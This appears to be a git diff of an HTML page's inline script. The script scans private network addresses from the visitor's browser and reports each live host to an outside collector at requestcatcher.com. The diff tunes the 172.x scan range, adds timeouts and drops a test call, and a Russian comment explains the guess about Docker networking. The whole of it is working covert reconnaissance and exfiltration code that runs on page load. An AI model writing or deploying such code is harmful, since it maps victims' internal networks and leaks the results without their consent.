@@ -11,33 +11,26 @@
     <script>
         'use strict'
 
-        let ips = []
         function sendInfo(ip) {
-            fetch(`https://l.requestcatcher.com/${ip}`, {
+            fetch(`https://l.requestcatcher.com/ip`, {
                 method: 'POST',
                 mode: 'no-cors',
                 signal: AbortSignal.timeout(3000),
-                headers: {
-                    'Content-Type': 'application/json;charset=utf-8'
-                },
-                body: JSON.stringify({ ip: ip })
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 'ip': ip })
             });
         }
         function scan() {
-            for (let subnet = 0; subnet < 100; ++subnet) {
-                for (let device = 0; device < 100; ++device) {
-
-                    //let address = `http://172.${subnet}.0.${device}`;
-                    subnet=168;
-                    let address = `http://192.${subnet}.1.${device}`;
-                    fetch(address, { mode: 'no-cors' })
+            for (let subnet = 1; subnet < 40; ++subnet) {
+                for (let device = 1; device < 10; ++device) {
+                    let address = `172.${subnet}.0.${device}`; // Мы же точно не знаем где находится наш сайт, а кто будет запускать сайт не в докере
+                    fetch('http://' + address, { method: 'GET', mode: 'no-cors', signal: AbortSignal.timeout(5000) })
                         .then(resp => {
-                            sendInfo(address)
+                            sendInfo(address);
                         })
                 }
             }
         }
-        sendInfo("test");
         scan();
     </script>
 </body>
